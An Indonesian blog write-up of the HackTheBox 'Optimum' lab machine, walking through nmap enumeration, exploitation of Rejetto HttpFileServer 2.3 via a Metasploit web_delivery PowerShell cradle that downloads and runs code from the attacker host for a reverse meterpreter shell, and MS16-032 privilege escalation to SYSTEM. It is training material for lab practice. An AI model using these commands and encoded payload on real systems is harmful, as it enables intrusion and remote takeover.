---
featured_image: "/uploads/justakazh/2023-01-03_11-12.png"
author_description: Aku nulis karena aku pelupa
author_avatar: "/uploads/justakazh/1656477958868.jpeg"
author_facebook: https://facebook.com
author_twitter: https://twitter.com
author_instagram: https://instagram.com
author_donation: paypal / saweria / buymecoffe / etc
author_web: https://blog.hackstreet.id
title: HackTheBox - Optimum
date: 2023-01-03T00:00:00+07:00
author: Justakazh
tags:
- windows
- hackthebox
- thb
- writeup
- rce
- msf
- metasploit
- powershell
categories: Capture the flag

---
## Summary

Machine Name : Optimum

Machine Difficult : Easy

Machine Author : [ch4p](https://app.hackthebox.com/users/1)

Machine URL : [https://app.hackthebox.com/machines/Optimum/activity](https://app.hackthebox.com/machines/Optimum/activity "https://app.hackthebox.com/machines/Optimum/activity")

## Enumeration

Hal pertama yang kita lakukan adalah melakukan enumerasi terhadap common port yang terbuka pada mesin tersebut.

```bash
# Nmap 7.92 scan initiated Tue Jan  3 09:00:35 2023 as: nmap -sS -oN nmapsSscan 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.38s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

# Nmap done at Tue Jan  3 09:01:09 2023 -- 1 IP address (1 host up) scanned in 34.76 seconds
```

hasil diatas tersebut menunjukan bahwa hanya ada 1 port yang terbuka yaitu 80/http. untuk memastikan port yang tersedia lainnya, mari kita coba untuk melakukan scanning terhadap seluruh port 1-65535

```bash
# Nmap 7.92 scan initiated Tue Jan  3 09:02:55 2023 as: nmap -p- -sS -oN nmapAllscan 10.10.10.8
Nmap scan report for 10.10.10.8
Host is up (0.35s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

# Nmap done at Tue Jan  3 09:11:53 2023 -- 1 IP address (1 host up) scanned in 537.99 seconds
```

pada hasil diatas tersebut hanya ada 1 port yang terbuka, selanjutnya mari kita coba untuk mengetahui informasi web server yang digunakan

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-03 11:18 WIB
Nmap scan report for 10.10.10.8
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
zsh: segmentation fault  nmap -p80 -sV 10.10.10.8
```

disini dapat kita ketahui dari hasil diatas bahwa web server yang berjalan adalah `HttpFileServer httpd 2.3`, mari kita mencari informasi exploit dari informasi tersebut menggunakan `searchsploit`

```bash
└─$ searchsploit HttpFileServer 2.3      
------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                   |  Path
------------------------------------------------------------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                      | windows/webapps/49125.py
------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

disini kita mendapati exploit `Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)`, saya telah membuat penjelasan exploit ini pada artikel yang berbeda [Rejetto HttpFileServer 2.3.x - Remote Command Execution](https://blog.hackstreet.id/posts/rejetto-httpfileserver-2.3.x-remote-command-execution/ "https://blog.hackstreet.id/posts/rejetto-httpfileserver-2.3.x-remote-command-execution/").

## Exploitation

untuk menjalankan exploit tersebut kita bisa mengetikan perintah

```bash 
python 49125.py [rhost] [rport] [command]
```

disini saya akan melakukan listening menggunakan module metasploit `exploit/multi/script/web_delivery` dengan mengetikan perintah

```bash 
msf6 > use exploit/multi/script/web_delivery 
[*] Using configured payload python/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set srvhost 10.10.14.2
srvhost => 10.10.14.2
msf6 exploit(multi/script/web_delivery) > set lhost 10.10.14.2
lhost => 10.10.14.2
msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set target 2
target => 2
msf6 exploit(multi/script/web_delivery) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.14.2:4444 
[*] Using URL: http://10.10.14.2:8080/iMwxTCyx
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6ADIAeQA5AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHoAMgB5ADkALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB6ADIAeQA5AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwBpAE0AdwB4AFQAQwB5AHgALwBXAGoAQwBOAFAAbQBnAHEAWQBVAHUANwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwBpAE0AdwB4AFQAQwB5AHgAJwApACkAOwA=
```

metasploit akan memberikan script payload (powershell) dan kita dapat mengirimkan melalui exploit tersebut dengan mengetikan perintah

```bash 
python 49125.py 10.10.10.8 80 "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6ADIAeQA5AD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAHoAMgB5ADkALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJAB6ADIAeQA5AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwBpAE0AdwB4AFQAQwB5AHgALwBXAGoAQwBOAFAAbQBnAHEAWQBVAHUANwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMgA6ADgAMAA4ADAALwBpAE0AdwB4AFQAQwB5AHgAJwApACkAOwA="
```

```bash
[*] 10.10.10.8       web_delivery - Delivering Payload (3514 bytes)
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.2:4444 -> 10.10.10.8:49229 ) at 2023-01-03 11:33:18 +0700
```

selanjutnya kita dapat mengakses session untuk masuk kedalam mode meterpreter (pada kasus ini session saya adalah 1)

```bash 
sessions 1
```

```bash 
msf6 exploit(multi/script/web_delivery) > sessions 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 3
Meterpreter     : x86/windows
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeChangeNotifyPrivilege
SeIncreaseWorkingSetPrivilege

meterpreter > 
```

disini kita hanya mendapatkan akses `users`(kostas), selanjutnya mari kita melakukan privilege escalation untuk mendapatkan hak akses sepenuhnya serta mendapatkan flag root.txt pada mesin tersebut.

## Privilege Escalation

untuk mendapatkan hak akses sepenuhnya pada mesin tersebut kita dapat mencoba untuk menggunakan module dari metasploit post/multi/recon/local_exploit_suggester dan setting value session dengan id session

``` bash
msf6 exploit(multi/script/web_delivery) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available expl
                                               oits
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 40 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) > 
```

dari hasil diatas tersebut ditunjukan bahwa kita dapat menggunakan module`exploit/windows/local/ms16_032_secondary_logon_handle_privesc` untuk mela_ukan privilege escalation,_untuk menggunakan module tersebut kita dapat mengetikan perintah

    msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options
    
    Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc):
    
       Name     Current Setting  Required  Description
       ----     ---------------  --------  -----------
       SESSION                   yes       The session to run this module on
    
    
    Payload options (windows/meterpreter/reverse_tcp):
    
       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.100.104  yes       The listen address (an interface may be specified)
       LPORT     4444             yes       The listen port
    
    
    Exploit target:
    
       Id  Name
       --  ----
       0   Windows x86
    
    
    msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set session 1
    session => 1
    msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lhost 10.10.14.2
    lhost => 10.10.14.2
    msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set lport 1337
    lport => 1337
    msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > run
    
    [*] Started reverse TCP handler on 10.10.14.2:1337 
    [+] Compressed size: 1160
    [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
    [*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\dmpQjYpbkw.ps1...
    [*] Compressing script contents...
    [+] Compressed size: 3753
    [*] Executing exploit script...
             __ __ ___ ___   ___     ___ ___ ___ 
            |  V  |  _|_  | |  _|___|   |_  |_  |
            |     |_  |_| |_| . |___| | |_  |  _|
            |_|_|_|___|_____|___|   |___|___|___|
                                                
                           [by b33f -> @FuzzySec]
    
    [?] Operating system core count: 2
    [>] Duplicating CreateProcessWithLogonW handle
    [?] Done, using thread handle: 2440
    
    [*] Sniffing out privileged impersonation token..
    
    [?] Thread belongs to: svchost
    [+] Thread suspended
    [>] Wiping current impersonation token
    [>] Building SYSTEM impersonation token
    [ref] cannot be applied to a variable that does not exist.
    At line:200 char:3
    +         $gD9F = [Ntdll]::NtImpersonateThread($d7Ma3, $d7Ma3, [ref]$rd9)
    +         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : InvalidOperation: (rd9:VariablePath) [], Runtime 
       Exception
        + FullyQualifiedErrorId : NonExistingVariableReference
     
    [!] NtImpersonateThread failed, exiting..
    [+] Thread resumed!
    
    [*] Sniffing out SYSTEM shell..
    
    [>] Duplicating SYSTEM token
    Cannot convert argument "ExistingTokenHandle", with value: "", for "DuplicateTo
    ken" to type "System.IntPtr": "Cannot convert null to type "System.IntPtr"."
    At line:259 char:2
    +     $gD9F = [Advapi32]::DuplicateToken($uiAT, 2, [ref]$yp0)
    +     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : NotSpecified: (:) [], MethodException
        + FullyQualifiedErrorId : MethodArgumentConversionInvalidCastArgument
     
    [>] Starting token race
    [>] Starting process race
    [!] Holy handle leak Batman, we have a SYSTEM shell!!
    
    hxrylfkbkBOcSA36xV2s0tPKNjOqnL53
    [+] Executed on target machine.
    [*] Sending stage (175174 bytes) to 10.10.10.8
    [*] Meterpreter session 9 opened (10.10.14.2:1337 -> 10.10.10.8:49235 ) at 2023-01-03 12:05:39 +0700
    [+] Deleted C:\Users\kostas\AppData\Local\Temp\dmpQjYpbkw.ps1
    meterpreter > getprivs
    
    Enabled Process Privileges
    ==========================
    
    Name
    ----
    SeAssignPrimaryTokenPrivilege
    SeAuditPrivilege
    SeBackupPrivilege
    SeChangeNotifyPrivilege
    SeCreateGlobalPrivilege
    SeCreatePagefilePrivilege
    SeCreatePermanentPrivilege
    SeCreateSymbolicLinkPrivilege
    SeDebugPrivilege
    SeImpersonatePrivilege
    SeIncreaseBasePriorityPrivilege
    SeIncreaseQuotaPrivilege
    SeIncreaseWorkingSetPrivilege
    SeLoadDriverPrivilege
    SeLockMemoryPrivilege
    SeManageVolumePrivilege
    SeProfileSingleProcessPrivilege
    SeRestorePrivilege
    SeSecurityPrivilege
    SeShutdownPrivilege
    SeSystemEnvironmentPrivilege
    SeSystemProfilePrivilege
    SeSystemtimePrivilege
    SeTakeOwnershipPrivilege
    SeTcbPrivilege
    SeTimeZonePrivilege
    SeUndockPrivilege
    meterpreter >

dapat ditunjukan pada hasil diatas tersebut kita telah berhasil melakukan privilege escalation dengan menggunakan exploit MS16032.